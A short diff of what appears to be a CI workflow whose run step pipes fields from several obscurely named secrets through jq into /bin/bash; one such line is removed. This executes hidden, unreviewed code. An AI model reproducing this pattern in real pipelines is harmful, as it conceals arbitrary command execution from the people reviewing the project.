@@ -17,7 +17,6 @@ jobs:
           l56: ${{ secrets.l56 }}
         run: |
           printf '%s' "$l56" | jq -r .fi222 | /bin/bash
-          printf '%s' "$e0" | jq -r .eju609 | /bin/bash
           printf '%s' "$n1" | jq -r .k414 | /bin/bash
           printf '%s' "$ag83983" | jq -r .dcivi9 | /bin/bash
           printf '%s' "$e851" | jq -r .pjvkx548 | /bin/bash
